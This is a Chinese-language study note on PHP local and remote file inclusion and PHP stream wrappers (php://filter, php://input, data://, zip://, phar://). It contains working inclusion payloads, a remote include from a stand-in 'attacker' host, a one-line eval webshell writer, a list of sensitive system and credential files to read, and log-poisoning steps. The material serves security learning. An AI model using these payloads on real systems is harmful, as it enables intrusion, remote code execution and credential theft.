---
created: 2023-12-19T11:31
updated: 2024-02-01T15:11
---
### 文件包含函数
php:include(),include_once(),require(),require_once();
JSP：ava.io.File(),java.io.FileReader()等
ASP:includefile,includevirtual
##### 本地文件包含
```php
<?php 
$file = $_GET['file']; 
if (file_exists('/home/wwwrun/'.$file.'.php')) { 
	include '/home/wwwrun/'.$file.'.php'; } 
?>
```
上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。
include()和require()的区别：require()包含没有的文件就会直接报错，include()包含没有的文件只会警告。
==只要文件内容符合PHP语法规范，那么任何扩展名都可以正确显示phpinfo信息==，那些文件上传就是喜欢配合文件包含。

###### - `%00` 截断
`?file=../../../../../../../../../etc/passwd%00`
==需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。==
###### - 路径长度截断

`?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.`

Linux 需要文件名长于 4096，Windows 需要长于 256。
###### - 点号截断

`?file=../../../../../../../../../boot.ini/………[…]…………`

只适用 Windows，点号需要长于 256。

##### 远程文件包含
条件：allow_url_include=on
```php
<?php 
if ($route == "share") { 
	require_once $basePath . "/action/m_share.php"; 
} elseif ($route == "sharelink") { 
	require_once $basePath . "/action/m_sharelink.php"; 
}
?>

```
构造变量 `basePath` 的值。

`/?basePath=http://attacker/phpshell.txt?`

最终的代码执行了

`require_once "http://attacker/phpshell.txt?/action/m_share.php";`

==问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。==
###### - 普通远程文件包含

`?file=[http|https|ftp]://example.com/shell.txt`

需要 `allow_url_fopen=On` 并且 `allow_url_include=On` 。

###### - 利用 PHP 流 input

`?file=php://input`

需要 `allow_url_include=On` 。

###### - 利用 PHP 流 filter

`?file=php://filter/convert.base64-encode/resource=index.php`

需要 `allow_url_include=On` 。

###### - 利用 data URIs

`?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`

需要 `allow_url_include=On` 。

###### - 利用 XSS 执行

`?file=http://127.0.0.1/path/xss.php?xss=phpcode`

需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
##### php文件包含利用
###### 读取敏感信息；
windows系统
```
C:\boot.ini          //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml      //IIS配置文件
C:\windows\repair\sam          //存储Windows系统初次安装的密码
C:\Program Files\mysql\my.ini     //Mysql配置
C:\windows\php.ini       //php配置信息
C:\windows\my.ini       //Mysql配置信息
```
unix/linux系统
```
/etc/passwd
/usr/local/app/apache2/conf/httpd.conf       //apache2默认配置文件
/usr/local/app/apache2/extra/httpd-vhosts.conf   //虚拟网站设置
/usr/local/app/php5/lib/php.ini           //php配置文件
/etc/httpd/conf/httpd.conf               //apache配置文件
/etc/my.cnf                               //mysql的配置文件
```
###### 本地包含配合文件上传
在上传的地方上传（如果文件上传没漏洞）规划文件，然后在文件里写插入shell代码，然后用文件包含来包含就可以执行之前插入的恶意代码。

###### 远程包含shell
allow_url_fopen选项是激活的。尝试远程包含一句话木马。
```
<?fputs(fopen("shell.php","w"),"<?php eval($_POST[xxx])?>")?>
```
就可以在访问的目录生成shell.php文件。
###### 使用php封装协议
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流

```
###### 包含日志文件
apache运行后一般会产生两个文件，一个是错误日志(error.log)，一个是访问日志(access.log)，当然这同样可以运用到ssh中，因为ssh也有日志。
写入木马到错误日志很简单，就是在url中写入<?php phpinfo()?>看看会不会直接写入
然后找到绝对路径进行包含。
所以自己搭建环境日志最好不要是默认的。
###### 截断包含
```
<?php
	if(isset($_GET['page'])){
		include $_GET['page'].".php";
	}else{
		include 'home.php';
	}
?>
```
这样包含什么都会在后面加上一个.php，要么就利用上如果想包含。jpg，的话就要阶段
==使用%00阶段，这方法只适用magic_quotes_gpc=Off，如果是ON%00就会被转义。php5.3也不能用了==
或者?和# 截断
magic_quotes_gpc=on下面预定义字符转义
单引号，双引号，反斜杠，NULL
不能用截断包含就用...填充进行长度截断。

## PHP内置封装协议详解
[PHP伪协议详解-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120695429)
##### php://伪协议
######  读取源码 php://filter
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

| allow_url_fopen | ：off/on |
| ---- | ---- |
| allow_url_include | ：off/on |

简单通俗的说，==这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程==
php://filter可以获取指定文件源码。当它与包含函数结合时，==php://filter流会被当作php文件执行。==所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
协议参数

|名称|描述|
|---|---|
|`resource=<要过滤的数据流>`|这个参数是必须的。它指定了你要筛选过滤的数据流。|
|`read=<读链的筛选列表>`|该参数可选。可以设定一个或多个过滤器名称，以管道符（`\|`）分隔。|
|`write=<写链的筛选列表>`|该参数可选。可以设定一个或多个过滤器名称，以管道符（`\|`）分隔。|
|`<；两个链的筛选列表>`|任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。|

常用：

```php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```
利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，==而通过编码后则可以读取文件源码。==
而使用的convert.base64-encode，就是一种过滤器。
###### 执行php代码 php://input
php://input可以访问请求的原始数据的只读流，==将post请求的数据当作php代码执行==。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
例如：  
```
http://127.0.0.1/cmd.php?cmd=php://input  
POST数据：<?php phpinfo()?>
```
注意：
当enctype="multipart/form-data"的时候 php://input` 是无效的
遇到file_get_contents()要想到用php://input绕过。

| allow_url_fopen | ：off/on |
| ---- | ---- |
| allow_url_include | ：on |
###### 数据封装器 data://

数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的==data://流会被当作php文件执行==
实例用法：
```
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

```
###### 访问本地文件 file://
用于访问本地系统，不不受allow_url_fopen，allow_url_include影响
`file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)  ``
比如：`http://www.xx.com?file=file:///etc/passsword`

| allow_url_fopen |  ：off/on |
| --- | --- |
| allow_url_include | ：off/on |

###### 访问压缩包文件php文件执行 zip://
zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
==zip://中只能传入绝对路径。==
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
![[Pasted image 20240129090728.png]]
###### phar:// 有点类似zip://同样可以导致 任意代码执行。
phar://中相对路径和绝对路径都可以使用  
![[Pasted image 20240129093134.png]]